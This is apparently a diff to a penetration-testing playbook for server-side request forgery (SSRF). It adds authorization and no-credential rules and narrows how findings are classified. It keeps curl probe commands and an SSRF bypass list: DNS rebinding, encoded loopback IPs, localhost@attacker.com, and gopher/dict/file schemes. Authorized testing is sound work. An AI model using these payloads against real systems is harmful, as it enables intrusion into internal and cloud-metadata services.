@@ -13,7 +13,6 @@ Find and confirm SSRF, then chain to internal/cloud metadata.
 python tools/oob_listener.py --start
 
 # Baseline: fetch your own callback via the sink:
-python tools/deser_probe.py <target-url> --param "url=http://<your-callback>/"    # or direct curl
 curl -s "<target-url>?url=http://<your-callback>/"
 
 # Bypass ladder (try in order): redirects, DNS rebinding (rbndr.us), IP tricks (2130706433, 0177.0.0.1, 127.1, [::ffff:127.0.0.1]), hostname tricks (localhost@attacker.com), protocols (gopher://, dict://, file://), double-encoding
@@ -27,10 +26,13 @@ curl -s "<target-url>?url=http://127.0.0.1:9200/_cat/indices"              # Ela
 
 ## Workflow
 
-1. Identify sink (URL fetch params) + baseline with own OOB endpoint → hit = CONFIRMED.
+1. Identify the sink and baseline with your own OOB endpoint. A correlated callback
+   proves server-side fetching; classify it as blind SSRF until impact is demonstrated.
 2. If blocked, ladder the bypasses (above) until one passes.
-3. Escalate: metadata (redact creds!), internal HTTP, internal services, gopher→Redis RCE (human approval).
-4. Blind SSRF: OOB callback = CONFIRMED → then chain.
+3. Escalate to metadata or internal services only with explicit authorization and a
+   non-sensitive marker; never retrieve or retain credentials.
+4. Blind SSRF: correlated OOB callback = `CONFIRMED_BLIND`; require a safe response or
+   demonstrated impact before reporting a higher-impact chain.
 
 ## Rules
 
